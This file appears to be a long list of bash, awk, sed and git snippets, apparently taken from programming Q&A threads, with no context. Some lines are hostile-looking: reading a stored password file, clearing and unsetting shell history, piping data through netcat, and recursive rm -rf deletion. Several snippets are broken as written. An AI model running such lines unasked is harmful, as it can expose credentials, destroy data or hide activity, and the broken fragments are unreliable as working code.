use strict;
use warnings;
for f in ...;
for my $f (...) { ... }
while (my $f = ...) { ... }
glob '/etc/puppet/nodes/*.pp'
echo 0 > /dev/tty.usbserial641
stty -f /dev/tty.usbserial641
files=($(ls ./*.txt | sort))
grep -w "Query"
find . -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'
ls -ld
awk '{print $NF, $1}'
man head
wc -l
echo check 1
echo check 2
echo check 2
echo check 2
script.sh http://www.google.com/
who | wc -l
chmod +x file(s)
bash nu.sh
perl -e 'for $abpow (-11..-9) { $abc=10**$abpow; for (1..9) { system("echo $abc"); } }'
LOGINOUTPUT: command not found
-w 3
man expect
git checkout master && git pull && git co - && git rebase master
'git co -'
git checkout @{-1}
git checkout -
npm install -g git-time
git-time <path>
grep -oP '"name" : "'${dbname}'\d*"'
hexdump -C
echo $SHELL
which bash
echo 'foo'"$list"'bar'
echo 'stuff' | nc -n 192.168.1.82 49153
cat <<EOF
man grep
rvm list rubies
[[ -s "$HOME/.rvm/scripts/rvm" ]] && source "$HOME/.rvm/scripts/rvm"
rvm get stable --auto-dotfiles
rvm get stable --auto-dotfiles
$ echo $PATH
$HOME/.rvm/gems/ruby-2.6.3/bin: ......
eval "$(pyenv init -)"
$ echo $PATH
$HOME/.pyenv/shims:$HOME/.rvm/gems/ruby-2.6.3/bin: ......
$ rvm use system
$ rvm use ruby-2.6.3
yum list updates
fgrep -vf report list
/var/ folder
mkdir BNP_CB
cat $LOG_FILE
bash -x yourscript.sh
cut -f1 $line
302 Moved Temporarily
302 Moved Temporarily
host_key like "%google.com"
-b /tmp/cookies.txt
set -x
$ mkdir -v 'the-directory'
$ type mkdir
echo 'G1o=' | base64 -d
1B 5a
ESC [ ? 6 c
ESC [ ? 62;9 c
git lg --since="24 hours ago" | tail -1
* f71da17 - blah blah blah (12 hours ago)
last_commit=$(git lg --since="24 hours ago" | tail -1); echo $last_commit
dir1/ dir2/ dir3/ file1 file2 file3 * f71da17 - blah blah blah (12 hours ago)
echo "$last_commit"
echo $REPLY
read -p "Enter data?" MYVAR;    echo $MYVAR
read -p "Enter data?" FIRSTVAR RESTOFSENTENCE;    echo $FIRSTVAR:$RESTOFSENTENCE
. myfuncs.sh && main
sed -i "2s/.*/n=$next_n/" ${0}
diff -b
(( ))
$(( ))
(( ))
$(( ))
echo ${DRIVE_SIZES[RANDOM]}
$(( ))
echo "$(( DRIVE_SIZES[RANDOM] ))"
(( ))
$(( ))
(( A = 1 + 2 ))
(( B = 1 ))
A='B + 1'
(( ))
$(( ))
history | wc -l
... | sort -n -k2
... | sort -n -k2 -r
cat: >>: No such file or directory
panicA2   panicA0
panicA2   panicA
bash --version
cat /dev/null > log.file
> log.file
cat /etc/issue
bash testlogredir.sh 2 y
bash testlogredir.sh 1
sleep 0.1
scp -i ~/.ssh/id_rsa pingmonitor@IP:~/pingmon.dat ./
sed 's/[^0-9]//g'
cat -v
grep --colour=always
find . -type d \(-name "*" ! -name "A" ! -name "B" \) -exec chmod 755 {}\;
find . -type d \(-name "*"
!-name "A" !-name "B"
chmod 755
expr1 -a expr2
expr1 -o expr2
dirname1, dirname2
egrep -v
wc -l
${10}, ${11}...
$10, $11, ...
echo $DYLD_LIBRARY_PATH
array=(a b c)
for item in "${array[@]}"
while read
while read; do ...; done < "$file"
uniq -c
echo "${ANIMAL}s are the best."
echo "$ANIMAL"'s are the best.'
printf '%ss are the best.\n' "$ANIMAL"
free | awk '{print $4}'
chmod u+x /path/to/file
/cygdrive/c/Users/my dir/Documents
cd $HOME
my dir
my\ dir
c:\Documents and settings
c:\Documents\ and\ settings/
cd "C:/Prgram Files (x86)"
cd 'C:/Program Files (x86)'
cd 'Folder Path'
cd Program\ Files \(x86\)
cd /cygdrive/c/Users/my\ dir/Documents
cd My\ Documents
cd "Name of Directory"
dir_with_spaces='path of the directory with spaces'
alias new_dir='cd $dir_with_spaces/subdirectory'.
a and d
sed 's|^cat: -0600|cat: -6|; s|^dog: -0700|dog: -7|;' file
svn look
$ history | grep ifv
$ grep ifv ~/.bash_history
history | grep term
<!-- Beginning git log -->
<!-- -->
watch "if [ find _source -mmin -1 ]; then make; fi"
hg status
sudo hg status
hg status
current_date HH:MM
Profiles > Terminal > Disable save/restore alternate screen > (uncheck the checkbox)
ln $(which echo) foo && time ./foo hello && rm foo
time bash -c 'exec -a foo echo hello'
time launch -a foo echo hello
time { (exec -a foo echo hello); }
time -a foo echo hello
exec -a
2>&1 >/dev/null
> /path/to/file
> /dev/null
(load "feature1")
FNR % 10 != 1
FNR % 10 == 0
FNR % 10 == 0
{print $0}
command file > new_file
ssh user@ip.addr 'find -type f -name "*.pdf" -exec cp {} ./pdfsfolder \;'
ec2 instance name
ec2metadata --instance-id
INSTANCE_ID=$(ec2metadata --instance-id)
monitor.sh x.x.x.x y.y.y.y
ifconfig -a
echo 'one two' | perl -MURI::Escape -wlne 'print uri_escape $_'
sh -x NonFibRecursive.sh 10
'[' 2 -gt 1 ']'
[^ ]*
echo $i
awk "{print $1}"
"awk '{print $1}'"
shopt -s nocasematch
if [[ "$line" == *"$word"* ]]
if [ "$line"==*"$word"* ]
1234 abc xyz 5678==*1234*
1234 abc xyz 5678
1234 abc xyz 5678
git checkout -b <branchname>
git newbranch mytestbbranch
date +%H
[[ ]]
(( ))
" "
' '
. makeAlias.sh
dirname: illegal option -- b
. ./makeAlias.sh
source ./makeAlias.sh
>file 2>&1
man bash
cat /etc/passwd | grep myUserName
bash -l
grep "root@192.168.1.10" ~/.passwords | cut -d ' ' -f2
#!/bin/ksh -x
grep VARIABLE
date '+%Y-%m-%d-%H'
lynx --dump
" "
echo "$myvar"
wget "$myurl"
[[ ]]
[[ ]]
(( ))
(( a = 5 * b ))
echo $(( a / 20 ))
(( ))
[[ ]]
if (( a <= b )); then ...
if [[ $a -le $b ]]; then ...
echo "$myvar" | tr a-z A-Z
cat filename | grep somestr
grep somestr filename
sort -k1 -u file.txt
man tee
awk 'BEGIN{OFS=FS="\t"} $1=$1"\t"'
awk -v 'OFS=\t' '$1=$1"\t"'
cd ./migrations/testdb && liquibase ......
-type f
-d $'\0'
-maxdepth 2
shopt -s lastpipe
-type f
< <(...)
... |
git ls-remote 2>&1 | grep inexistent-match
"somescript.sh <fileInput.txt"
man tput
man terminfo
do shell script
(path to resource "myAwesomeScript.pl")
& " " &
" "
match not found
sudo -v
--requires="libvte9 (>= 0.28.2)"
--requires "libvte9, libc6"
libvte9 (>= 0.28.2), libc6 (>= 2.13)
--requires "package \(= 1.0\)"
; # & * ~ ( ) < > \ |
* ~
; #
( ) < > | &
perl -pe 's/([[:punct:]])/\\\1/g'
' " $
help mapfile
cp -r
cp -R
cp -a
cp -pPR
cp -fR
cp -fa
Current Folder
use Text::CSV
,      4 ,112.175.173.80 ,TCP ,80
,112.175.173.80, 0, N/A, unknown, unknown
,      4 ,112.175.173.80 ,TCP ,80, 0, N/A, unknown, unknown
cat -v file.sh
cat -v
od -a test.sh
cat -v test.sh
od -bc yourscript.sh
if else
60*1st + 2nd
url =
set -xv
set +xv
set -xv
{u'Adapters': ['/org/bluez/709/hci0']}
[[ ]]
if [[ -z "$1" ]]; then
if [[ -z $1 ]]; then
mkdir -p "$HOME/.config/old_dotfiles"
if [ $DECISION == "N" -o $DECISION == "n" ];
if [[ ${DECISION^^} == N]];
echo -n "--exclude-agent="$line"
sort -mu
cat filename | sort
info "(bash)Bash Builtins"
-u fd
type read
help read
read -u3 -r f1
fd 3
fd 3
bash: XX: Is a directory
-maxdepth 1
-type f
<!--#include file="myfile.html"-->
<!--#include file="myfile.html"-->
<!--#include file="myfile.html"-->
set -e
a.html b.txt
-maxdepth 1
{foo bar 1.1.2} foo
bar 1.1.2
BarVersion=$(sed -n "/bar [.0-9]/p" file.txt)
echo $BarVersion
{foo bar 1.1.2} foo
-W depend=
all=("$x" "$y")
grep -F
tr -s " " < your_file
sed 's/ /,/g'
read type path
mkdir -p
$(basename "$file" .tree.txt)
/etc/cron.daily/myapp_backup.sh -> /var/www/myapp/backup.sh
for loops
man bash
$1 == "France"
cap deploy
` `
' '
ssh user@server passwd
spawn user@server
man bash
sendmail "$myemail"
date +%W
VAR=$(complex command )
complex command
. Values.ini
kill $PID
kill $PID $($PID+1)
./bzip2 -ds sample3.bz2 -k
sed -e 's/logging.config.file=[^\s]+/logging\.config\.file\=\/new/g' file
eval '$cmd'
cmd="echo anymessage"
eval '$cmd'
echo anymessage
echo anymessage
cat /data/test/test.tx* | grep toto
cat /data/test/test.tx* | grep toto
2013 07 30 22 09 00
YYYY MM DD hh mm ss
tail -f output
Ctrl + C
1>&2 output
> output 2>&1
echo $PYTHONPATH
echo $PATH
echo $LD_LIBRARY_PATH
which python
Brew Doctor
sudo vi /etc/paths
Brew Docotor
echo 'export PATH="/usr/local/bin:/usr/local/sbin:~/bin:$PATH"' >> ~/.bash_profile
My code and output:
Desired output:
man awk
echo -ne
Hello world | cut -d' ' -f1
-d' '
"-d' '"
"-d "
[[ ]]
getopts optstring name
indirect expansion
if ... elif ...
variable indirection
dev|std) eval ... ;;
<script>sfsdfsfsdf</script> CONTENT <script>sdfsdfsdf</script>
make install
./configure >> /usr/local/the_packages/install.log 2>&1
set -e
#!/bin/bash -e
bash -e scriptname
set -e
a trap on ERR
#!/bin/sh filename
sh my_script
<<< ""
process substitution
here documents
here strings
command substitutions
echo <(:)
seq 5
seq 5
seq 5
seq 5
seq 5; echo done generating sequence >&2
seq 10000000
cd ~/MyProject/scripts && ./foo.sh
cd ~/MyProject && scripts/foo.sh
[[ -e myscript ]]
5 | ./prog
sh -c "a b c"
var1=$(echo "$PBS_ARRAYID" -l)
grep -vf filterfile input.csv
grep -u
sort -u
sort -u
grep -E
for file in $(find ...)
comm -23 - "$suppfile"
"whatever" .(Español (España)).srt
"whatever" (Español (España)).srt
((1 == 1)) && echo "1 == 1" || echo "1 != 1"
$( )
ingroup group [user]
id -Gn
groups $username_here | grep -q '\busergroup\b'
user_in_group userfoo groupbar
id -nG $USER
grep -qw $GROUP
grep -w "soughtword
sudo apt-get install pssh
npm install
a && b && c
a && b || c
[!] FATAL: You must run jasagerPwn from inside the directory...
echo $a
echo "$a"
b=$(echo $a | sed -e 's/^\ *|\ *$//g')
:echo $VIM
colorscheme <name>
:colorscheme <c-d>
-i ''
paste <(echo "$VAR1") <(echo "$VAR2") --delimiters ''
1    ao
man bash
set -o vi
sed "/world/ s/.*/${a}\n&/"
pathN 
echo $character | grep -Eq '^(\+|-)?[0-9]+$'
input: command not found
my_command | cut -f1,2
sed -i
set daemon
my_command | awk -F "[[:space:]]{2,}+" 'NR>1 {print $2}' | egrep "^[[:alnum:]]"
awk -v record=$i
11 12 13
File Info
type myscript
set -x
bash -x myscript
set -x
-rd $'\0'
find /backup -name 'folder_*' -type d -ctime 7 -exec rm -rf {} \;
fab does_not_work
cd /folder/two && change_path_command && some_random_command
alias subl="/Applications/path/to/subl"
ln -s
ln -s
ln -s
alias mumble="substitution"
alias subl="/Applications/path//to/subl"
sed 's/[ \t]//g'
sed ':a;N;$!ba;s/\n//g'
sed 's/<t.>//g'
sed 's/<\/td/,/g'
sed 's/<\/tr/\n/g'
shopt -s lastpipe
man ps
man lsof
man pts
-f FILE
ps -ocomm=
column 1 AND column 2
column 1 and column 3
every ::::0
$(seq 0 $((${#consC}-1)) )
"$(expr "$consC" : '^.\{'"$i"'\}\(.\)')"
awk 'BEGIN { while ((getline line < ARGV[1]) > 0) a[i++] = line; ARGV[1] = ""; } { for (i = 1; i in a; ++i) { t = a[i]; gsub(/XXXX/, $0, t); print t }; }' file1 file2
[ $new != $old ]
cat /etc/something > 1
cat /etc/something-else > 2
./checker.sh: line 2898: syntax error: unexpected end of file
grep -vFf file2 file1 | sed 's|,cl_id.*$||'
sed 's|[0-9]\+\s\+||' file
sudo apt-get install screen
man screen
printf '%02d' $num
help printf
seq -w
for nn in (00..99) ; do ...
for nn in (000..999) ; do ...
bash --version
man tee
exec > >(tee -a)
echo $!
a_cmd | grep -o -E '[[:space:]]{2,}[a-zA-Z0-9\.,_()]+.+[[:space:]]{2,}'
daemon:fatal: failed to tell if ....
. venv/bin/activate
pip install Flask
-bash: pip: command not found
brew doctor
${Clear Workspace}
Clear Workspace=true
grep -P
negative lookbehind
grep "loom" ~/projects/**/trunk/src/**/*.@(h|cpp)| grep -v "gloom"
grep -v
!/^ /&&/:$/{p=0}
/^Header 2:$/{p=1}
Header 2
-bash: syntax error near unexpected token '('
myCMD "function()"
myCMD function()
printf $i" "
xargs -n37 < file
xargs -n3
($6 in a)
{print "TIMESTAMP=\""$2"\"\nSQLTEXT=\""$10"\"\n=========\n" > $6".txt"}'
gawk -f script.awk file1 file2
foo.db.1 does not exist
chromium-browser path|file
start myFilename.html
explorer "C:\Program Files\Git"
open -a "google\ chrome.app" index.html
open index.html
start index.html
google-chrome < filepath >
google-chrome --new-window < filepath >
google-chrome --incognito (--incongnito-mode)  < filepath >
explorer.exe index.html
{"app_versions":[{"version":"16125","shortversion":"4.4.0","title":"App 1","timestamp":1377277516,"appsize":46110031,"mandatory":false,"minimum_os_version":"6.0","device_family":"iPhone/iPod","id":22,"app_id":25196,"download_url":"https://rink.hockeyapp.net/apps/b5dc72777668ca5716aa6aec8237058f/app_versions/22","status":2,"tags":["alpha"]},{"version":"16126","shortversion":"4.4.0","title":"App 1","timestamp":1377177516,"appsize":46330031,"mandatory":false,"minimum_os_version":"6.0","device_family":"iPhone/iPod","id":20,"app_id":25190,"download_url":"https://rink.hockeyapp.net/apps/b5dc72777668ca5716aa6aec8237058f/app_versions/20","status":2,"tags":["alpha"]}
if [ ${PARAM1:0:1} = "/" ]; then
[ "${PARAM1:0:1}" = "/" ]; then
if [[ ${PARAM1:0:1} = "/" ]]; then
mkdir -p $(dirname $TRASH$PARAM1)
mkdir -p "$(dirname "$TRASH$PARAM1")"
Path askpass ...
python -c 'print "hello\nworld"'
echo $?
set -e
set -x
help set
set -e
print $0
source init
wget http://unfccc.int/resource/docs/convkp/kpeng.pdf -O amit.pdf 2> amit.log
hello world
x='.... '
$RANDOM % 5
iOS builds
Application Target->
iOS builds
vim pdeOptAff.tex
alias g='gvim --remote-silent'
Corrupt Input
its not recognized as tar file
sed 's/^M$//' compressed_file.dmp.Z^M>compressed_file.dmp.Z
pathname expansion
process substitution
here strings
command substitution
while read
sed 's/[^a-zA-Z0-9_\.-]//g'
printf '%c
cut -c1
cut -c1
awk substr
printf '%s'
ll /bin /tmp
sed -i "s/CC -shared/CC -shared TEST/g" libtool
:help cmdline-special
./echoparams This is a "test target"
"This is a \"test target\""
Aug 28 13:00
ls -la
2013/08/28 13:00:00
| tee
| tee -a my.log
| tee -a my.log
grep -F
echo $a
1 2 3 4
man bash
[[ ]]
echo $a
a="echo foo | wc -l"; $a
1 2 3 4
1 2 3 4
man date
(date +%F_%H-%M_%p)
./optAlg.exe $inputFile 500 2>&1 > output/$outputFile
echo -e
c:/Users/cjross/bin/pdfgrep -i [etc...]
set -o vi
$(__git_ps1 '(%s) ')
at -f
$[ 1 + 2 ]
at -f
printf %q
-t  Force pseudo-terminal allocation.
This can be used to execute arbitrary screen-based programs on a remote machine, which can be very useful, e.g.
when implementing menu services.  Multiple -t options force tty allocation, even if ssh has no local tty.
FOO="123 456"
-f filename
Missing argument for -c
screen -dmS analysis
nohup ./script.sh &
cd test
{ ... }
| cat
{ mkdir dir; cd dir; pwd; } | cat; pwd;
{ mkdir dir; cd dir; pwd; } | cat;
{ mkdir dir; cd dir; pwd; }
{ mkdir dir; cd dir; pwd; }; pwd; cd -
change dir
{ }
( )
{ }
grep --color=always
[ ]
man bash
sed -i "" "s/original/replacement/g"
-i ""
xwininfo -stats
bc -l
man bash
sed -r 's/(.*)<my_tag>([A-Z][A-Z])<\/my_tag>(.*)/hello\2/g' myfile.out
grep -o "<my_tag>[A-Z][A-Z]</my_tag>" myfile.out | sort -u
7 88 9
7 9 88
tail -n1
tail -n+$L|head -n1
dp some-project
dp b{tab}
dp blog
cd blog
"bash myfile.sh"
screen -ls 2>&1
grep '(Detached)'
grep -o 'ScreenName'
xargs -I{} -n 1 -r screen -r -S {} -X quit
-n 1
sed 's/|*|//2'
echo some string | command arg1 arg2
a=$(wc -l < $1)
git status
git checkout -- .
git status
Requested report is unknown
git svn clone
screen -dr
screen -dr
tmux list-sessions
history -s
stdbuf -oL
GNU bash, version 4.2.45(1)-release
shopt noglob
--transform, --xform
tar --help 2>&1 | grep -Fe --transform
DOC_DIRECTORY = ../doc
make doc
get_classes.sh  'CBaseClass' src/
First Name="Kunal";Middle Name="";Last Name="Bhowmick";Address 1="HGB";Address 2="cvf";Address 3="tfg";City="DF";State="KL";Country="MN";Postal Code="0012";Telephone="(+98)6589745623"
grep -H
C*(r_(i+1)-r_i)^3 * d_i
echo "This is the string I want to print in next line" | tr " " "\n"
{ sleep 2; echo "Sleep done"; } &
{ { sleep 2; echo "Sleep done"; } & } 2>/dev/null
export LC_ALL=C
unset LC_ALL
15:02:34 up 21 days, 3:52,  1 user,  load average: 0,06, 0,20, 0,33
hg help push
hg push
hg out
hg push
set -e
hg push
ctrl+shift+c, ctrl+shift+v
git diff <filename>
git checkout <filename>
git diff
declare -A
C:\Program Files (x86)\Git\bin\start
342 200 223
e2 80 93
var=foo command
missing destination file after operand after $SVN
set arg1 $1
cat file | grep $f1
NR == FNR { if ($0 ~ s) { gsub(/"/, "", $5); a[$1, $5] = 1; }; next; }
a[$1, $2] { print $3; }
compgen -c
grep '^ID.[0-9][0-9][0-9]' input_file | cut -c1-6 | sort | uniq -c
read -p
is awesome
echo -e
read -p
echo -n
touch file1.txt
$1 $2
Hello World
exec(String[] args)
sort -g
copyfile.sh: 1: copyfile.sh: [d: not found
[[ ]]
-bash: c: command not found
<div class="content"> main </div> <div class="data"> 100 </div>
openssl s_client
man s_client
$filename is present
ls -l $(tty)
ls -l $(tty)
bash script.sh
bash -l
/bin/echo 'hello'; bash -l
pigz --help
man pigz
<a href="xxx"
<a href="xxx"
bash: bin/rails: No such file or directory
bundle install
git add .
git commit -m "Add bin back"
git push heroku master
git add bin
shopt -s checkwinsize
checkwinsize on
. /etc/bashrc
. splitter.sh
[ $TYPE = "d" ] && alias cp="cp -r"
cp -r
cp -r
set -x
[[ ]]
[ ]
[[ ]]
ls -C
ls --color=auto
man dircolors
ls -G
export CLICOLOR=1
echo $PATH
for example
bash start_parallel.sh
bash script.sh
expect script.exp
bash script.sh your_python_script arg1 arg2 ...
sh script.sh your_python_script arg1 arg2 ...
[1] 1234
[1] 1234
FLUSH TABLES WITH READ LOCK
echo $PATH
/bin/cat ~/.bash_profile
while getopts “hf:p:u:” OPTION
''\''hello' 'world'\''' world
eval $(...)
background-image : url(/image/test.png);
background-image : url("/image/test.png");
background-image : url('/image/test.png');
syntax error near unexpected token `)'
/usr/bin/myExecutable param1 param2 &
grep --color=auto
test -t <fd>
[ -t <fd> ]
help test
[ ... ]
[[ ]]
(( ))
[[ ]]
[[ ]]
[[ ]]
(( ))
#define EX_USAGE 64 /* command line usage error */
echo $PATH
<<< ""
read -rd ''
./script.sh: line 5: 055: command not found
poll for time
tpc file.pas
.dosbox/TP/BIN/$(basename $1 .pas).EXE
source python.py
no input files
bash script.sh < file
$' \t\n'
-d ''
sort <<<"fnord"
echo "fnord" | sort
sort <<<"${arr[*]}"
set -o noglob
set -f
read -a
echo "$(<file)"
echo "$(40<file)"
echo 0<file_name
echo arg1 arg2 ...
cat < file_name
SNMPv2-SMI::enterprises.14823.2.2.1.4.1.2.1.39.252.200.151.233.54.69.197.39.5.77 = STRING: "Android"
grep -Eo '(\.[0-9]{1,3}){4}\s*=.*$' | sed -r 'sed -r 's/\s*=[^:]+:/=/;s/^\.//'
hello_world: command not found
bash lib.bash
. lib.bash
mvn --version
"location" : "Stockholm"
sed "$1q;d"
alias second="awk 'FNR==2'"
cat file | second
second file
cmd | func args
function sift { awk "FNR==$1" ;}
cat file | sift 2
process substitution
cat /proc/net/wireless | grep wlan0
bash -c ...
rf_line = popen("/bin/grep wlan0 /proc/net/wireless", "r");
 rf_line = fopen("/proc/net/wireless","r"); 
man 2 write
$MY_COMMAND $MY_ARGUMENT
svn ci
svn ci -m"$(LOGMSG)"
svn propset --revprop
svn commit
$ ^[[1~ ^[[4~
set -g default-terminal "screen-256color"
cat -v
cat -v
tmux using zsh
cat -v
set-window-option -g xterm-keys on
tmux -V
wc -l
while read
while read
-bash: cx_Freeze: command not found
module not found
python -mtimeit
python -mtimeit "n = 0; while n < 10: pass"
n += 1
awk --version
set -m
ifconfig | grep -cs 'status: active'
ONLINE=ifconfig | grep -cs 'status: active'
$(ONLINE=ifconfig | grep -cs 'status: active')
grep -cs ...
Subroutines do not return values in bash, just exit status
sudo: no tty present and no askpass program specified
sudo visudo
su -
{if (a[$1]) next}
print $0
seq 2
seq 2 > out.dat
done > out.dat
rm aaa 2>> >( ...
mv /home/ubuntu/scripts_old/new.txt /home/ubuntu/scripts_new/
mv new.txt ../scripts_old/
with administrator privileges
do shell script (quoted form of myCommand) with administrator privileges
with administrator privileges
sudo open -a /Application/appname.app &
sudo osascript -e 'tell app id "com.app.bundleid"' -e activate -e end
do shell script (quoted form of myCommand) with administrator privileges
sudo open -a Finder
sudo /System/Library/CoreServices/Finder.app/Contents/MacOS/Finder
with administrator privileges
command not found. either the command was written wrong or couldn't be found
set +e; some-command; res=$?; set -e
set -e
echo $PATH
which bundle
mkdir -p
sudo gem install bundler
1 2
type -P
[[ ]]
... > /dev/null 2>&1
A Note on Compiling through Cygwin SSHd
" "
sh -c '...'
curl http://example.com/
echo 'echo "hello $1"'
<<<'here string'
a b aaaa
b a bbbb
x i ahu
date '+%F %T'
tail -F | grep -q --line-buffered
echo "" >> catalina.out
if tail ...| grep
sh --version; sh -c ': <(echo a)'
-o posix
Ctrl + C
kill -9 41643
du -s
du -s
du cannot access...
du -s 2>/dev/null
man bash
gawk -f script.awk sample.txt
echo -ne "$(date)\r"
man tput
man terminfo
<<< "$result
xargs rm
bash -x pre-commit
{a, b, c}
wc -l
grep -c
trailing backslash
echo $GTUNNELNATNETIP
echo "$GTUNNELNATNETIP"
${curFruit: -1}
for in word; do ...; done
rstccc-tool.lin failed
echo "abc" > /tmp/fifo
date -d
Connection to host.com closed.
Baton Rouge, LA 70821
check if string starts with '#'
git filter-branch --tree-filter 'git ls-files -z "*.php" |xargs -0 perl -p -i -e "s#(PASSWORD1|PASSWORD2|PASSWORD3)#xXxXxXxXxXx#g"' -- --all
$id = $_GET["myUrlParam"];
ps -ef
ps -ef | grep "port 10"
echo *
ssh -t remote_user@remote_host
[[ -f $x ]]
find /home/myfolder -type f -print0 | xargs -0 grep -l -E 'abc.*def.*ghi'
kill -ABRT that_pid
$A = ~/tmp/
cd $A<TAB>
cd $A/tmp1
cd $A/tmp1<space>
cd $A<TAB>
cd ~/tmp/<without additional space>
cat -A
<< somefile
< somefile
foo -h
cut -d "#" -f 2
cut -c 2-
if [ "$1" = "-h" ]
split -C
history -c
unset HISTFILE
man bash
ps --ppid $PID
pgrep -P <parent_pid>
[[ ]]
[ ]
-l 5
"date +%s -d ....
bash script.sh
-m 1
:set nowrap
cd /path/to/dir; find . -exec scp -pr {} hostname:/tmp/. \;
help test
man test
(( ))
[[ ]]
[[ $a -gt $b ]]
(( $a > $b ))
(( $(bc <<< "...") ))
ubuntu 12.04, x86_64
rm -f file
bash del.sh
sh: 1: source: not found
$(cut -d ',' -f2 MyAssignment.csv)
echo "${eCollection[@}]}"
echo $REMOTE
echo "$REMOTE";
xentop -i 1
bash script.sh
let i=0
./script 'asdads * '
export PATH=$PATH:$HOME/anaconda/bin
iTerm 2
Sublime Text 3
subl ~/.zshrc
export PATH=$PATH:$HOME/anaconda/bin
conda --v
zsh: command not found: rvm-prompt
alias rvm-prompt=$HOME/.rvm/bin/rvm-prompt
source .zshrc
zsh: command not found: rvm-prompt
chmod +x *
vim ~/.zshrc
export PATH="/Users/yourusername/anaconda2/bin:$PATH"
export PATH=~/anaconda3/bin:$PATH
export PATH="<base location>/anaconda3/bin:$PATH"
export PATH="/anaconda3/bin:$PATH"
source $/anaconda3/bin/activate
$ gedit .bashrc
export PATH = /home/nour/anaconda3/bin:$PATH
conda --version
$ source ~/.bashrc
C:\Program Files (x86)\Microsoft Visual Studio\Shared\Anaconda3_64\Scripts
source ~/.bashrc
export PATH=$USERPROFILE/AppData/Local/Continuum/anaconda2/Scripts/:$PATH
export PATH=$USERPROFILE/AppData/Local/Continuum/anaconda3/Scripts/:$PATH
SET PATH=%USERPROFILE%\AppData\Local\Continuum\anaconda2\Scripts\;%PATH%
SET PATH=%USERPROFILE%\AppData\Local\Continuum\anaconda3\Scripts\;%PATH%
export PATH="/app/Miniconda/bin:$PATH"
set -a
set -a; source("set_my_path.sh")
set -a
export PATH=
conda activate
export PATH=...
conda init
conda init
source .bashrc
conda init
./anaconda3/bin/conda init --help
conda init
export PATH=${PATH}:/Users/davidfortini/miniconda3/bin
man bash
Oh, but can you execute it in bash just by using ./script ?
setsid make > make.out 2>&1
make -i
cat file.txt
cat file
read -r line
the quick brown fox
$(echo {$a..3})
/etc/init.d/redis_6379 start
use start or stop as an argument
chkconfig --list
chkconfig --add scriptname
chkconfig --level 345 scriptname on
service --status-all
sudo service
daemonize yes
-C /var/www/site1
man tar
tar -cvf site1-$seqNumber.tar -C /var/www/ site1
tar -cvf site1-$seqNumber.tar -C /var/www/site1 . 
<Carriage Return>
sed 's/^[\t ]*//g'
sort -n -t" " -k1
sort -n
cat | awk
| LC_ALL=C sort -rn
make install
find /usr/local/bin ! -lname '../Cellar/*'
setenv PATH ~/bin:/usr/local/bin:/usr/local/sbin:/usr/bin:/bin:/usr/sbin:/sbin:/usr/libexec:/usr/texbin
jekyll -w serve
open "http://localhost:4000"
jekyll -w serve
open "http://localhost:4000"
jekyll serve > /dev/null 2>&1 & sleep 5 && open "http://localhost:4000"
jekyll serve
-o, --open-url
-l, --livereload
bash script.sh 20130821
sh script.sh 20130821
myscript (date)
-a 4
-l 7
ls -r
[[ ]]
x | y
if [ "$slave_col2" =  "$master_col2" ]; then
scrapy crawl site1
cd ~/.virtualenvs/email-scraper/
sh sitecode/runspiders.sh
sudo sh sitecode/runspiders.sh
bash script.sh
sudo sh script.sh
git-receive-pack: command not found
foreach x([bq]ls item.*.txt[bq])
for x in $(ls item.*.txt)
if else fi
bash script.sh aaa.txt bbb.txt
bash script.sh aaa.txt bbb.txt > out.txt
bash script.sh aaa.txt bbb.txt
# alias tetras=/home/user/tde.sh
[start_time, stop_time]
md5 -q image.png
du -k image.png
stat -f "%z bytes"
// @if (debug)
// @endif
// @if (debug)
some code 2
struct passwd
path-to-shell shell-name -c env
while () { ... }
screencapture -l idwindow output
nohup command </dev/null >/dev/null 2>&1 &
screen -dm command
exec <&6
ls -il
-bash: php: command not found
* * * * * wget http://www.domain.com/cron_script.php
/usr/bin/php /path/to/yourscript.php
which php
printf '%h\n'
<?xml ... ?>
<?xml ... ?>
fuser /dev/ttyUSB0
Strlen Or Ind = 0x7fff9c84ee88 -> 255
SQLLEN indicator;
let var=foo
let var+=bar
(( ))
(( ))
let var+=bar
chmod +x test.rb
ruby test.rb
puts "Hello!
cat -e
test -o
bundle exec gem list | grep rack
rack (1.1.2)
cat Gemfile | grep rack
cat Gemfile | grep rails
gem 'rails', '2.3.14'
cat Gemfile.lock | grep rack
bundle config path
p $:.grep /rack/
bundle install
rvm current
date -ud "20130515 UTC + 1 day"
if test "$Test" = 1
("gksudo", "gedit")
sudo -S *command*
#includedirs /etc/sudoers.d/
IFS=. read -r disk <<< $image
nohup ./get_final.sh &
nohup ./get_final.sh &
[[ ]]
[[ $x =~ [$0-9a-zA-Z] ]]
[[ $x =~ "[$0-9a-zA-Z]" ]]
[[ $x =~ [\$0-9a-zA-Z] ]]
[[ $x =~ [0-9a-zA-Z\ ] ]]
/bin/login -f username
-f username
"/usr/local/bin/envpairs0 /tmp/tempfile \n logout \n "
bash -c
set -x
successfully brew update
environ = NULL
execle("/bin/csh", "-csh", NULL, NULL)
'patte*n1' 'pa*ter*2' 'p*3'
echo $LIST
echo $LIST
echo ... | xargs
lcov 1.12
bash 4.3.46(1)
grep -vf
grep -f
grep -v
exec 0<&6 6<&-
exec 0<&6-
tempfile - create a temporary file in a safe manner
mktemp - create a temporary file or directory
[ -e ]
[ -f ]
[ -d ]
[ -L ]
help test
type -P
#!/usr/bin/env python
#!/usr/bin/env python3.3
RS RS
test nav
help test
eval $1
2> /dev/null
skel .bashrc and .bash_profile to ~ and in .bashrc
bash: have: command not found
"output=$(send "rpm -i mypkg.rpm\r")"
set output "some content"
output=$( command )
--exclude "aenlever/*"
echo _${exclude}_
hash -r
type -P prog
hash -r
crontab -u $n -l
(value_row_n+1)-value_row_n < 0
cat import.txt | sqlite3 my.db
ruby script.rb data > output.csv
foo bar dog cat lion
(dog cat lion)
wait $pid2
./copier.sh myimage.jpeg prefixes.txt
mkdir test
echo $x | cut -c 6-7
echo $x | cut -c 1-4
echo $x | cut -c 9-10
tee test_report.txt
tee -a test_report.txt
find . | grep "file_for_print" | xargs -I % sh -c 'echo %; cat %;'
-I %
sh -c '...'
echo [filename]
cat [filename]
mkdir -p /data
ERROR 5286:  Unsupported SET option ON_ERROR_STOP
vsql -v ON_ERROR_STOP=on
job 7 at Wed Sep 11 01:35:00 2013
man 7 regex
Local Address
PID/Program name
Send-Q > 4000
Send-Q > 0
> temp1
> temp3
Ruby on Rails
sed 's/text/new text/g'
sort -k -n ...
man ls
Error: AudioFileOpen failed ('typ?')
export PATH=$PATH:$HOME/path/to/script/
sudo -E myscript
sudo -E script
sudo env
sudo sudo
expr error
head -n NUMBER FILE
